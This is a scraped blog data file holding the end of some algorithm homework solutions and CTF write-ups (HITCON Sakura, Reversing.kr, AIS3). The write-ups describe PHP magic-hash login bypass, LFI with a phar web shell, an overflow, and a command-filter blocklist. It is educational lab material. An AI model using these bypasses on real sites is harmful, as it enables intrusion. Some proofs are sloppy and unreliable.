nlog_2(n) + \\frac{1-n}{1-2}$$ problem 4 Given a set of n+1 numbers out of the first 2n natural numbers 1, 2, …, 2n, prove by mathematic induction that here are two numbers in the set, one of which divides the other. Basis : $n &#x3D; 1, 1|2 $Assume that, for $n &#x3D; k$, it holds(select k+1 numbers from first 2k natural numbers). When $ n &#x3D; k + 1 $(select k+2 numbers from first 2k+2 natural numbers), there are three situation: Each number we select is less or equal to 2k, means that we select k+2 numbers from first 2k natural numbers. Under this situation, it holds. One number we select is greater than 2k, means that we select remaining k+1 numbers from first 2k natural numbers. Under this situation, it holds. We select both 2k+1 and 2k+2 : If we select k+1, then $(k+1)|(2k+2)$. It holds. If not, then it’s similar to the situation 2 ,which we select k+1 numbers from first 2k natural numbers.It means there exists $x|y$ in k+1 numbers we selected , if $ x \\ne k+1, y \\ne k+1 $,that means we can find $x|y$ in situation 3 without term k+1, but what if x or y equal to k+1 ? if $x|y,y&#x3D;k+1$,it mean $x$ is ALSO a factor of 2k+2. It still holds.$$ QED $$ problem 5 For an undirected graph $G&#x3D;(V, E)$ and a vertex $v$ in $V$, let $G\\backslash v$ denote the subgraph of $G$ obtained by removing $v$ and all the edges incident to $v$ from $G$. If $G$ is connected, prove that we can always find a vertex $v$ in $G$ such that $G\\backslash v$ is connected. We know that if a graph is connected, there is a spanning tree. Removing the leaf node of spanning tree still makes graph connected. problem 6 Given $n \\geq 1$ numbers x1, x2, …, xn, show that the function $f(x) &#x3D; \\sum_{1\\le i\\le n}|x-x_i|$ takes its minimum value at the median of these n number. Extend this result to the following problem: Given n pairs of numbers (a1, b1), …, (an, bn) with each $ ai \\ne 0 $ , determine the position at which the function $ f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i| $ takes its minimum value. $$let;M;&#x3D;;median;of;x_i$$$$ x_1 \\le x_2 \\le … \\le x_s \\le A \\le x_{s+1} \\le … \\le x_t \\le M \\le x_{t+1} \\le … \\le x_n $$ If n is even and an arbitrary number A is less or equal than M:$$ n &#x3D; 2t $$$$ f(A) &#x3D; {\\sum_{i&#x3D;1}^s(A-x_i) + \\sum_{i&#x3D;s+1}^n(x_i-A)}$$$$ &#x3D; \\sum_{i&#x3D;1}^t(A-M+M-x_i) - \\sum_{i&#x3D;s+1}^t(A-x_i)+\\sum_{i&#x3D;t+1}^n(x_i-M+M-A) +\\sum_{i&#x3D;s+1}^t(x_i-A)$$$$ &#x3D; \\sum_{i&#x3D;1}^t(M-x_i)+ t(A-M) + \\sum_{i&#x3D;t+1}^n(x_i-M)+(n-t)(M-A) + 2\\sum_{i&#x3D;s+1}^t(x_i-A)$$$$ &#x3D; \\sum_{i&#x3D;1}^t(M-x_i) + \\sum_{i&#x3D;t+1}^n(x_i-M) + 2\\sum_{i&#x3D;s+1}^t(x_i-A) +(n-2t)(M-A) $$$$ when;A;&#x3D;;M,;2\\sum_{i&#x3D;s+1}^t(x_i-A);has;minimum;value$$(Proof this when A&gt;&#x3D;M,and when n is odd, it’s easy) Extend this result to $ f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i| $ $Let;v_i&#x3D;|a_i|,w_i&#x3D;\\frac{b_i}{a_i}$$$f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i|$$$$&#x3D; \\sum_{1\\le i\\le n}|a_i||x-\\frac{b_i}{a_i}|$$$$&#x3D; \\sum_{1\\le i\\le n}v_i|x-w_i|$$$f(x) &#x3D; \\sum_{1\\le i\\le n}v_i|x-w_i|$ takes its minimum value at the median of the sequence :$$w_1,w_1,…,w_1,…,w_2,w_2,…,w_2,…,w_n,w_n,…,w_n$$$$|———v_1——–||———v_2—-|….|—–v_n——|$$ problem 7 Prove the Helly Property on Trees: Given a tree T and k subtrees of T such that each pair of subtrees has at least one vertex in common, show that there is at least one vertex incommon to all the subtrees. Definition of Helly Property : A family $ \\\\{A\\_i: i \\in I \\\\} $ of subsets of a set $A$ is said to satisfy the Helly property,if $J \\subseteq I$, and $A\\_i\\cap A\\_j\\ne \\emptyset$, for every $i, j \\in J$, then $\\cap\\_{j\\in J}A\\_j\\ne \\emptyset$. Briefly, a set $J$ of sets $A_i$ has the Helly property if for every subset $T$ of $J$ the following holds: if the elements of $T$ pairwise intersect, then the intersection of all elements of $T$ is also non-empty. Quoted from here problem 8 Let $d_1, d_2, …, d_n,;n\\le 2$, be positive integers. Prove that if $d_1+ d_2+ …+ d_n &#x3D; 2n - 2$, then there exists a tree with n vertices of degrees exactly $d_1, d_2, …, d_n$. Based on your proof, design an efficient algorithm to construct such a tree. Basis :when $n&#x3D;1,d_1&#x3D;0$,it holds.when $n&#x3D;2,d_1&#x3D;1,d_2&#x3D;1$ , it holds. Induction :$$ Let;d_1\\le d_2\\le d_3\\le … \\le d_n $$$$ d_1&#x3D;1,otherwise, $$$$ d_1+ d_2+ …+ d_n \\ge 2n \\ge 2n - 2 $$$$ when;n\\ne 2, d_n\\ge 2,otherwise,$$$$ d_1+ d_2+ …+ d_n &#x3D; n &lt; 2n-2 $$ Therefor$$ d_1+ d_2+ …+ d_n +d_{n+1} &#x3D; 2(n+1)-2 &#x3D; 2n $$$$ d_1+ d_2+ … + d_n +d_{n+1} - 2 &#x3D; 2n-2 $$$$ d_1+ d_2+ … + (d_n +d_{n+1} - 2) &#x3D; 2n-2 $$$ d_1+ d_2+ … + (d_n + d_{n+1} - 2) $ satisfy the induction hypothesis, so there exist a tree with n vertices with these degrees.Remove $(d_{n+1} - 1)$ neighbours from the vertix whose degree is $(d_n + d_{n+1} - 2)$, connect those neighbours with a new node,and connect the new node with the vertix whose original degree is $(d_n + d_{n+1} - 2)$.Then we get$$ d_1+ d_2+ … + d_n +d_{n+1} &#x3D; 2n $$$$QED$$ algorithm : Sort $d_1+ d_2+ …+ d_n$ in ascending order. Create a node $P$ with smallest degree in sequence excluding 1. Iterating from 1 to n,and add nodes to $P$ until the degree of p become 1. Go back to 2 until there is no more nodes can be added problem 9 Let G&#x3D;(V, E) be a directed graph (not necessarily acyclic). Design an efficient algorithm to label the vertices of the graph with distinct labels from 1 to |V| such that the label of each vertex v is greater than the label of at least one of v’s predecessors, or determine that no such labeling is possible. (A predecessor of v is a vertex w such that $wv \\in E$) You can find it in Morris's old blog. [Q8](http://mypaper.pchome.com.tw/zerojudge/post/1325745839) problem 10 Give a linear-time algorithm that takes as input a tree and determines whether it has a perfect matching: a set of edges that touches each node exactly once. perfect matching : [English](http://mathworld.wolfram.com/PerfectMatching.html), [Chinese](http://www.csie.ntnu.edu.tw/~u91029/Matching.html) Because leaf nodes must match with their parent, we can perform a devide and conquer algorithm. pseudo code#define UNMATCH 0#define MATCH 1#define FAIL -1int PerfectMatching ( n ) if child of n == 0 // if this node is leaf return UNMATCH // told it&#x27;s parent node that &quot;this child node is unmatch&quot; match_flag &lt;- UNMATCH //state of current node foreach child c of n //loop to check the state of every child node of current node state &lt;- PerfectMatching( c ) if state == UNMATCH //if child node is UNMATCH, if match_flag == UNMATCH //and current node is UNMATCH, too match_flag = MATCH // match them. else // But if the state of current node is MATCH, return FAIL //means this tree won&#x27;t be perfect matching else if state == FAIL return FAIL return match_flag problem 11 Consider a variation of the towers of Hanoi. We no longer assume that all the disks are initially on one peg. They may be arbitrarily distributed among the three pegs, as long as they are ordered in decreasing sizes on each peg. The purpose remains to move all disks to one specified peg, under the same constraints as the original problem, with as few moves as possible. Design an algorithm to find a minimal sequence of moves. How about the reverse of the problem? The solution is similar to original Hanoi problem Recursive Solution:1. Find the biggest disk2. If the disk is moveable to goal peg then move and go to 4, otherwise, go to 3.3. Set-up (N−1)-disk tower on non-goal peg.4. Back to 1 problem 12 Let T be an undirected tree. The distance between two vertices in T is the length of the path connecting these two vertices (neighbours have distance 1). The diameter of T is the maximal distance over all pairs of vertices. Design an algorithm to find the diameter of the given tree. Because the highest two subtree of T determind the diameter of T. The algorithm look like this: Picking an arbitrary node, then find the farthest node $P_f$ from it. Next, find the farthest node $P_g$ from $P_f$. The distance between $P_g$ and $P_f$ is the diameter of T. It’s easy to proof. problem 13 Consider the iterative method for solving the towers of Hanoi problem described in Unit 2. Prove the correctness of the algorithm. iterative methodwhile (1) &#123; move the smallest disk from its current peg to the next peg in clockwise order; if( all disks are correctly piled on someother peg ) break; make the only move possible that does notinvolve the smallest disk;&#125; We have three peg, $P\\_0\\;P\\_1\\;P\\_2$ ,and $K$ disks,$D\\_1,D\\_2,D\\_3,...,D\\_K$ ,$K \\in N$. Assume that all disks are at peg $P\\_0$ initially. $K$ is odd : Disks will be moved to the peg $P\\_{(0+1)mod3}$ $K$ is even : Disks will be moved to the peg $P\\_{(0+2)mod3}$ Basis :$K&#x3D;1$:Move $D_1$ from $P_0$ to $P_1$it holds. $K&#x3D;2$:Move $D_1$ from $P_0$ to $P_1$Move $D_2$ from $P_0$ to $P_2$Move $D_1$ from $P_1$ to $P_2$It holds Induction :Assume that it holds when $K&#x3D;n$ and n is odd.($D_1,…,D_K $ would be moved from $P_0$ to $P_1$) $When;K&#x3D;n+1$:||Step1. Move top n disk from $P_0$ to $P_1$ (Induction hypothesis)||Step2. Last move of previous step is moving smallest disk from $P_0$ to $P_1$, |so the next move is moving $D_{n+1} from $P_0$ to $P_2$||Step3. Move n disk from $P_1$ to $P_2$ (Induction hypothesis)||All disks are being moved from $P_0$ to $P_2$, it holds| Assume that it holds when $K&#x3D;n$ and n is even.($D_1,…,D_K $ would be moved from $P_0$ to $P_2$) $When;K&#x3D;n+1$:||Step1. Move top n disk from $P_0$ to $P_2$ (Induction hypothesis)||Step2. Last move of previous step is moving smallest disk from $P_0$ to $P_2$, |so the next move is moving $D_{n+1} from $P_0$ to $P_1$||Step3. Move n disk from $P_2$ to $P_1$ (Induction hypothesis)||All disks are being moved from $P_0$ to $P_1$, it holds|$$QED$$","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"2017::HITCON-Quals::Sakura::English","slug":"2017-HITCON-Quals-Sakura-English","date":"2017-11-07T07:39:57.000Z","updated":"2018-05-04T15:55:16.000Z","comments":true,"path":"en/2017-HITCON-Quals-Sakura-English/","permalink":"http://blog.terrynini.tw/en/2017-HITCON-Quals-Sakura-English/","excerpt":"Ask to input 400 chars, then take it as a 20*20 arryNext the binary run a function to verify the arrayIf the verification were success, it would give you the SHA256 hash of you input, which is flag Let’s take a look at the function I mentionedThere are 150 while loops in this functionBefore loops, it initialize lots of variablesThose loops are all similar to each:","text":"Ask to input 400 chars, then take it as a 20*20 arryNext the binary run a function to verify the arrayIf the verification were success, it would give you the SHA256 hash of you input, which is flag Let’s take a look at the function I mentionedThere are 150 while loops in this functionBefore loops, it initialize lots of variablesThose loops are all similar to each: V1 &lt;- fetch a local variablecounter &lt;- call addition function to determine how many time to loopWhile fetch a char from UserInput according to V1 the int(char) can only be 1~9, or fail the int(char) can not repeat in this while loop, or fail add the int(char) to local variable (sum) of this loopENDsum should equal to a certain value, or fail !!Notice that if verification was failed, the binary would not stop immediately, it only set the flag to false It’s not so hard to find out that you can do some symbolic execution to get the right inputBut there are so many loops and so many variablesThis is a ppc problem (っ・Д・)っ Because I don’t know how to quickly get the address that I want to put into the avoid of angr’s explorer, I decided to use z3 solver. For convenient, let’s name some weird function.Most of them just return the argument directly, so I named them nothingSome function would return the argument adding by a number, so I named them plus_(number)OK, I dumped psudocode to sakura_de.c and seperate the syntax of initializing local variables to a text file, variable Now, all I need to do is to write a script to generate a z3 script solver.py #! /usr/bin/env python# -*- coding: utf-8 -*-import ref = open(&quot;./sakura_de.c&quot;, &quot;r&quot;).read()#get the variable and constraint of every loopidx = re.findall(&quot;v[0-9]* = \\(__int64 \\*\\)nothing_[0-9]*\\(\\(__int64\\)\\&amp;v([0-9]*)\\)&quot;, f)loop_n = re.findall(&quot;v[0-9]* = plus_([0-9]*)&quot;, f)con = re.findall(&quot;\\( v[0-9]* \\!= ([0-9]*) \\)&quot;, f)f = open(&quot;./variables&quot;, &quot;r&quot;).read()#get the local variable on stackequ = re.findall(&quot;v([0-9]*) = ([0-9]*);&quot;, f) stack = [0]*1944for ( x , y ) in equ: stack[int(x)] = int(y)get_stack = lambda a,b: (stack[int(idx[a])+b*2] + (stack[int(idx[a])+1+b*2] &lt;&lt;32))z3_code = &quot;&quot;&quot;#! /usr/bin/env python# -*- coding: utf-8 -*-from z3 import *s = Solver()&quot;&quot;&quot;#add constraint to z3for row in range(20): for col in range(20): name = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;&#123;&#125; = Int(&#x27;&#123;&#125;&#x27;)\\n&quot;.format(name,name) z3_code += &quot;s.add( 0 &lt; &#123;&#125; , &#123;&#125; &lt; 10)\\n&quot;.format(name,name)for j in range(150): loop = int(int(loop_n[j])/8) this_loop = [] for i in range(loop): xx = get_stack(j,i) row = xx&amp;0xffffffff col = xx&gt;&gt;32 this_loop.append((row, col)) for i in range(0,len(this_loop)-1): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) for k in range(i+1,len(this_loop)): (row, col) = this_loop[k] b = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;s.add( &#123;&#125; != &#123;&#125;)\\n&quot;.format(a, b) z3_code += &quot;s.add(&quot; for i in range(len(this_loop)): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot; &#123;&#125; + &quot;.format(a) z3_code += &quot; 0 == &#123;&#125;)\\n&quot;.format(con[j])z3_code += &quot;&quot;&quot;s.check()m = s.model()sakura = [0]*400for i in m: row = ord(str(i)[0]) - ord(&#x27;A&#x27;) col = int(str(i)[1:]) sakura[ 20*row + col ] = str(m[i])print &#x27;&#x27;.join(sakura)&quot;&quot;&quot;exec z3_code sakura_de.c (partial) __int64 __fastcall sub_850(__int64 UserInput)&#123; v604 = (__int64 *)nothing_16((__int64)&amp;v904); v754 = plus_16((__int64)&amp;v904); while ( v604 != (__int64 *)v754 ) &#123; v1 = *v604; *(&amp;OutPutArray[20 * (signed int)v1] + SHIDWORD(v1)) = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)); v454 = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)) - &#x27;0&#x27;; if ( v454 &lt;= 0 || v454 &gt; 9 ) Success = 0; if ( (v304 &gt;&gt; v454) &amp; 1 ) Success = 0; v304 |= 1 &lt;&lt; v454; v154 += v454; ++v604; &#125; if ( v154 != 17 ) Success = 0; v155 = 0; v305 = 0; v605 = (__int64 *)nothing_16((__int64)&amp;v908); v755 = plus_16((__int64)&amp;v908); while ( v605 != (__int64 *)v755 ) &#123; v2 = *v605; *(&amp;OutPutArray[20 * (signed int)v2] + SHIDWORD(v2)) = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)); v455 = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)) - 48; if ( v455 &lt;= 0 || v455 &gt; 9 ) Success = 0; if ( (v305 &gt;&gt; v455) &amp; 1 ) Success = 0; v305 |= 1 &lt;&lt; v455; v155 += v455; ++v605; &#125; if ( v155 != 3 ) Success = 0; variables (partial) v904 = 1;v905 = 6;v906 = 2;v907 = 6;v908 = 1;v909 = 7;v910 = 2;v911 = 7;v912 = 2;v913 = 1;v914 = 3;v915 = 1;v1312 = 2;v1313 = 2;v1314 = 3;v1315 = 2;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]},{"title":"2017::HITCON-qual::Sakura","slug":"2017-HITCON-qual-Sakura","date":"2017-11-07T07:39:57.000Z","updated":"2017-12-18T00:56:19.000Z","comments":true,"path":"tw/2017-HITCON-qual-Sakura/","permalink":"http://blog.terrynini.tw/tw/2017-HITCON-qual-Sakura/","excerpt":"要求輸入 400 個字元然後會把輸入當作20*20的陣列丟入function做驗證有 150 個迴圈在進入迴圈會把需要的 local 變數設好流程如下","text":"要求輸入 400 個字元然後會把輸入當作20*20的陣列丟入function做驗證有 150 個迴圈在進入迴圈會把需要的 local 變數設好流程如下 取一個本地變數出來每個迴圈做的次數不等迴圈 根據剛剛取出的數為準從使用者輸入中拿字元出來 檢查範圍是否在1~9 不能有重複的數字 都沒問題就把它累加進本回圈的sum並且放入sha256要用的陣列中 再取一次本地變數出來迴圈結束檢查sum是否符合本迴圈要求的數值通過150個迴圈的話則會印出flag 我看有人用angr解，但是我覺得塞位置給 angr avoid 有點麻煩不如把 psudocode dump 出來用正規表達取變數直接生一段 z3 code 解限制式 方便等等 parse 先把一些奇怪的 function name 修改一下大多數只是單純回傳，我命名為 nothing有做加法再回傳的命名為 plus_數字把 psudocode 放進 sakura_de.c 然後前面 local variable 的指定式長得太大眾臉了，我把它移到 variable 文字檔 solver.py #! /usr/bin/env python# -*- coding: utf-8 -*-import ref = open(&quot;./sakura_de.c&quot;, &quot;r&quot;).read()#get the variable and constraint of every loopidx = re.findall(&quot;v[0-9]* = \\(__int64 \\*\\)nothing_[0-9]*\\(\\(__int64\\)\\&amp;v([0-9]*)\\)&quot;, f)loop_n = re.findall(&quot;v[0-9]* = plus_([0-9]*)&quot;, f)con = re.findall(&quot;\\( v[0-9]* \\!= ([0-9]*) \\)&quot;, f)f = open(&quot;./variables&quot;, &quot;r&quot;).read()#get the local variable on stackequ = re.findall(&quot;v([0-9]*) = ([0-9]*);&quot;, f) stack = [0]*1944for ( x , y ) in equ: stack[int(x)] = int(y)get_stack = lambda a,b: (stack[int(idx[a])+b*2] + (stack[int(idx[a])+1+b*2] &lt;&lt;32))z3_code = &quot;&quot;&quot;#! /usr/bin/env python# -*- coding: utf-8 -*-from z3 import *s = Solver()&quot;&quot;&quot;#add constraint to z3for row in range(20): for col in range(20): name = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;&#123;&#125; = Int(&#x27;&#123;&#125;&#x27;)\\n&quot;.format(name,name) z3_code += &quot;s.add( 0 &lt; &#123;&#125; , &#123;&#125; &lt; 10)\\n&quot;.format(name,name)for j in range(150): loop = int(int(loop_n[j])/8) this_loop = [] for i in range(loop): xx = get_stack(j,i) row = xx&amp;0xffffffff col = xx&gt;&gt;32 this_loop.append((row, col)) for i in range(0,len(this_loop)-1): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) for k in range(i+1,len(this_loop)): (row, col) = this_loop[k] b = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;s.add( &#123;&#125; != &#123;&#125;)\\n&quot;.format(a, b) z3_code += &quot;s.add(&quot; for i in range(len(this_loop)): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot; &#123;&#125; + &quot;.format(a) z3_code += &quot; 0 == &#123;&#125;)\\n&quot;.format(con[j])z3_code += &quot;&quot;&quot;s.check()m = s.model()sakura = [0]*400for i in m: row = ord(str(i)[0]) - ord(&#x27;A&#x27;) col = int(str(i)[1:]) sakura[ 20*row + col ] = str(m[i])print &#x27;&#x27;.join(sakura)&quot;&quot;&quot;exec z3_code sakura_de.c (partial) __int64 __fastcall sub_850(__int64 UserInput)&#123; v604 = (__int64 *)nothing_16((__int64)&amp;v904); v754 = plus_16((__int64)&amp;v904); while ( v604 != (__int64 *)v754 ) &#123; v1 = *v604; *(&amp;OutPutArray[20 * (signed int)v1] + SHIDWORD(v1)) = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)); v454 = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)) - &#x27;0&#x27;; if ( v454 &lt;= 0 || v454 &gt; 9 ) Success = 0; if ( (v304 &gt;&gt; v454) &amp; 1 ) Success = 0; v304 |= 1 &lt;&lt; v454; v154 += v454; ++v604; &#125; if ( v154 != 17 ) Success = 0; v155 = 0; v305 = 0; v605 = (__int64 *)nothing_16((__int64)&amp;v908); v755 = plus_16((__int64)&amp;v908); while ( v605 != (__int64 *)v755 ) &#123; v2 = *v605; *(&amp;OutPutArray[20 * (signed int)v2] + SHIDWORD(v2)) = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)); v455 = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)) - 48; if ( v455 &lt;= 0 || v455 &gt; 9 ) Success = 0; if ( (v305 &gt;&gt; v455) &amp; 1 ) Success = 0; v305 |= 1 &lt;&lt; v455; v155 += v455; ++v605; &#125; if ( v155 != 3 ) Success = 0; variables (partial) v904 = 1;v905 = 6;v906 = 2;v907 = 6;v908 = 1;v909 = 7;v910 = 2;v911 = 7;v912 = 2;v913 = 1;v914 = 3;v915 = 1;v1312 = 2;v1313 = 2;v1314 = 3;v1315 = 2;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]},{"title":"Reversing.kr #1","slug":"Reversing-kr-write-up-1","date":"2017-07-20T02:34:12.000Z","updated":"2017-11-07T09:01:00.000Z","comments":true,"path":"tw/Reversing-kr-write-up-1/","permalink":"http://blog.terrynini.tw/tw/Reversing-kr-write-up-1/","excerpt":"本來想把9題擠一篇的，但想想還是分一下好了，總之Easy系列完全就是 easy peasy lemon squeezy這篇共4題，還沒解題建議不要先看。","text":"本來想把9題擠一篇的，但想想還是分一下好了，總之Easy系列完全就是 easy peasy lemon squeezy這篇共4題，還沒解題建議不要先看。 Easy Crack首先發現輸入密碼錯誤時會跳出錯誤訊息： 以 Incorrect Password 作為關鍵字搜尋disassemble的位址往上一點會發現上面有字串的判斷邏輯： 慢慢比對就可以把flag拼出來了： Easy Keygen題目要求我們找到序號為 5B134977135E7D13 時，名字應該會是什麼分析後發現程式會把[0x10,0x20,0x30]作為key不斷xor輸入的字串然後把加密後的字串的ascii用hex印出來寫個腳本反解回去就好了: from binascii import *serial = bytearray(unhexlify(&quot;5B134977135E7D13&quot;))key = [0x10, 0x20, 0x30]flag = &quot;&quot;for i in range(len(serial)): flag += chr(serial[i] ^ key[i%len(key)])print(flag) Easy Unpack總之這殼還滿簡單的，解壓縮結束時有個jmp，跟過去就是OEP了本來以為兩個段是像upx一樣，一個段解壓縮進去另外一個段再執行，但是其中一個段好像沒有執行權限。 Easy ELF丟進gdb下幾個斷點就可以知道要求輸入的長度是5，並且對字元做xor然後做檢查看是要逆算回來還是做個fuzzing就好了","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"}]},{"title":"AIS3 pre-exam write up","slug":"2017-AIS3-pre-exam-write-up","date":"2017-07-14T18:22:24.000Z","updated":"2017-07-22T08:43:52.000Z","comments":true,"path":"tw/2017-AIS3-pre-exam-write-up/","permalink":"http://blog.terrynini.tw/tw/2017-AIS3-pre-exam-write-up/","excerpt":"總之我終於擊敗惰性開始寫writeup了，去年剛開始接觸資安的時候好像還不知道AIS3，所以這是第一次參加AIS3，總之本來想好好解逆向結果解不出來只有12名，培訓時間還跟我要去日本的時間完美的重疊了，慘。","text":"總之我終於擊敗惰性開始寫writeup了，去年剛開始接觸資安的時候好像還不知道AIS3，所以這是第一次參加AIS3，總之本來想好好解逆向結果解不出來只有12名，培訓時間還跟我要去日本的時間完美的重疊了，慘。 web1其實這題在幹嘛我忘記了 web2$msg = &quot;&quot;;if (isset($_POST[&quot;username&quot;]) and isset($_POST[&quot;password&quot;]))&#123; $username = (string)$_POST[&quot;username&quot;]; $password = (string)$_POST[&quot;password&quot;]; $success = false; foreach ($db as $row) &#123; if ($username == $row[&quot;username&quot;] and md5($password) == $row[&quot;password&quot;]) &#123; $msg = &quot;Successful login as $username. Here&#x27;s your flag: &quot;.$flag; $success = true; break; &#125; &#125; if (!$success) &#123; $msg = &quot;Invalid username or password.&quot;; &#125;&#125; 這題要求登入一個用php寫得簡單網頁，php做的就是用你的username去找他本來就寫好的一串md5 hash然後把你輸入的password也做md5之後使用 == 做比較，不難發現是php弱比較的利用，仔細看就會發現有一個md5 hash是 0e 開頭，把對應的username還有 QNKCDZO 當作密碼就會拿到flag了。 web3這題根本是從eduCTF拿過來再利用吧哈哈哈總之是LFI(local file inclusion)的漏洞，flag在哪我失憶了。 web4這題也有LFI的漏洞，不過靠LFI把index.php拉出來會發現他把一個upload的功能隱藏起來，從網址進去之後會發現它是一個只能上傳jpg圖片的功能，然後會告訴你上傳之後亂數產生的檔名，但是只是單純過濾副檔名，所以用phar搭配LFI的漏洞可以做出web shell，再來就只是拿flag而已。 Pwn1這題你輸入什麼他就直接跳到那裡執行這樣，有個function叫做youcanseeme，跳過去執行就好了，值得注意的是因為scanf吃到空白會停止，而剛好function的開頭位址會讓scnaf只吃到一半，所以要往後跳一點。 Pwn2用C++寫的一支程式，雖然是PE檔案格式，結果這題連分析也不用就知道要怎樣做了，關鍵在 struct user &#123; char name[20]; int pass;&#125; ais3_user; 因為C++中這種struct的記憶體會連在一起，所以輸入name的時候多敲幾個把pass壓過去就好了。 Reverse1直接執行，中間會產生flag。 Reverse2這題給了rev2和encrypted兩個檔案，encrypted是被rev2加密的flag，rev2加密的方式是用srand(time(NULL))之後，然後使用rand()來加密，程式內有顯示這支程式建立的時間是台灣時間 6&#x2F;26。因為time(NULL)實際上傳回的是目前的unix timestamp，srand再以此做出亂數表，因此把6&#x2F;26的unix timestamp開始一直用srand做出亂數表，然後跟encrypted做xor然後檢查是不是flag就好了。 Crypto1這題的flag被三個數值做xor，不過不需要做出個別值，因為xor之後完全沒有差別，因為知道flag是AIS3開頭，所以把xor的值解出來後把剩下的部分也xor出來就好了 #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; int val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr; char flag[29] = &quot;????????????????????????????&quot;; // Hint: The flag begins with AIS3 for(i = 0, ptr = (int*)flag ; i &lt; 7 ; ++i) printf(&quot;%d\\n&quot;, ptr[i] ^ val1 ^ val2 ^ val3 ^ val4); /* 964600246 1376627084 1208859320 1482862807 1326295511 1181531558 2003814564 */ return 0;&#125; Crypto2因為用了ECB mode ，所以每個區塊間沒有關聯，而且加密用的key也不會換，造成cut &amp; paste attack。 Crypto3 &amp; Crypto4sha1 collision，這兩題滿有趣的。在做比較的時候使用的是 === 而不是 == 所以不能用陣列的方法繞過，因此就是利用google在2月時找到的sha1碰撞，把兩個文件作為username還有password傳入。Crypto4 則是利用string() parse的時候會被\\00截斷，加入題目要求的字串，而最後一個條件則是sha1的結果開頭要是f00d，只要在文件後面加入一堆\\00，結果就會不一樣，所以就寫個腳本自動檢查就好了。 &lt;?phpinclude(&quot;flag.php&quot;);if (isset($_GET[&quot;source&quot;])) &#123; show_source(__FILE__); exit();&#125;function startsWith($haystack, $needle)&#123; $length = strlen($needle); return (substr($haystack, 0, $length) === $needle);&#125;if (isset($_POST[&quot;username&quot;]) and isset($_POST[&quot;password&quot;]))&#123; $username = (string)$_POST[&quot;username&quot;]; $password = (string)$_POST[&quot;password&quot;]; $h1 = sha1($username); $h2 = sha1($password); if ($username == $password) &#123; $msg = &quot;Your password can not be your username.&quot;; &#125; else if ($h1 === $h2) &#123; $msg = &quot;Flag1: $flag1&quot;; if (strpos($username, &quot;Snoopy_do_not_like_cats_hahahaha&quot;) !== false and strpos($password, &quot;ddaa_is_PHD&quot;) !== false and startsWith($h1, &quot;f00d&quot;)) &#123; $msg .= &quot;&lt;/br&gt;&quot;; $msg .= &quot;Flag2: $flag2&quot;; &#125; &#125; else &#123; $msg = &quot;Invalid password.&quot;; &#125;&#125;?&gt; MISC2就只顯示了I&#39;ve sent you something :)，網頁註解裡面有一個img的tag &lt;img src=&#39;sudoku.png&#39;&gt;，把註解拿開後會顯示一張數獨的圖片：然後我以為這題是steganography，結果跟原圖根本就連一bit都沒差別啊。用curl看header才會發現： decode後就會得到S74G32.php，進去後會看到一張png: 總之我的膝蓋告訴我flag一定在白色的地方，因為他九成是png: MISC4這題要ssh到一台主機，然後權限很低，flag就在眼前但是不能cat。有三個檔案flag、shell、shell.c，shell.c長這樣： #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;\\\\&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; setregid(getegid(), -1); if(argc &lt; 2) &#123; return 0; &#125; delete_env(); putenv(&quot;PATH=/this_is_not_a_valid_path&quot;); 